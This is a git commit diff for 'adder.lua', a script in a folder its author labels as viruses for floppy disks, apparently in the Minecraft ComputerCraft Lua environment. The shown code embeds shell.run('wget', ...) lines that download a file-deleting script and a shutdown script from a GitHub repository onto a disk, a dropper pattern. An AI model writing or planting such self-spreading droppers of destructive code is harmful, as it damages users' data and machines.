cb2851d2b1722d796fe01a78db12d964ea7f91b0
Fakedrift <127430703+Fakedrift@users.noreply.github.com>
2023-07-13 20:39:29 +0100

    Update adder.lua

--- Virus's (go on floppy disks)/adder.lua
+++ Virus's (go on floppy disks)/adder.lua
@@ -1,4 +1,4 @@
-local VF = fs.open("adder.lua")
+local VF = fs.open("adder.lua", "w")
 local VS = [[
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/DELETER.LUA", "disk/DELETER.lua")
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/shuttydowny.lua", "disk/shuttydowny.lua")
